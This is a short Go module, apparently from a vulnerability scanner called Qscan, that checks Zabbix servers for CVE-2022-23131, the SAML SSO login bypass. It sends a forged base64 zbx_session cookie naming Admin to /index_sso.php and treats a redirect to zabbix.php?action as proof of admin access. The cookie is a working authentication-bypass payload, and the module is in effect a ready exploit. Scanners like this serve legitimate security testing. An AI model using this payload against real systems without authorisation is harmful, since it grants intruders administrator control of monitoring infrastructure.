package zabbix

import (
	"Qscan/http"
	"fmt"
	"strings"
)

func CVE_2022_23131(url string) (bool, map[string]string) {
	info := map[string]string{
		"漏洞名称":  "Zabbix登录绕过漏洞",
		"CVE编号": "CVE_2022_23131",
		"漏洞简介":  "Zabbix 存在安全漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下，恶意行为者可以修改会话数据，因为存储在会话中的用户登录未经过验证。 未经身份验证的恶意攻击者可能会利用此问题来提升权限并获得对 Zabbix 前端的管理员访问权限。",
		"漏洞链接":  "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE_2022_23131",
		"危害等级":  "高危",
	}
	header := make(map[string]string)
	header["Cookie"] = "zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9"
	resp, err := http.Get(url+"/index_sso.php", header)
	if err != nil {
		return false, nil
	}
	if strings.Contains(resp.Location, "zabbix.php?action") && resp.StatusCode == 302 {
		fmt.Println("[+]存在Zabbix登录绕过漏洞(CVE_2022_23131)")
		return true, info
	}
	return false, nil
}
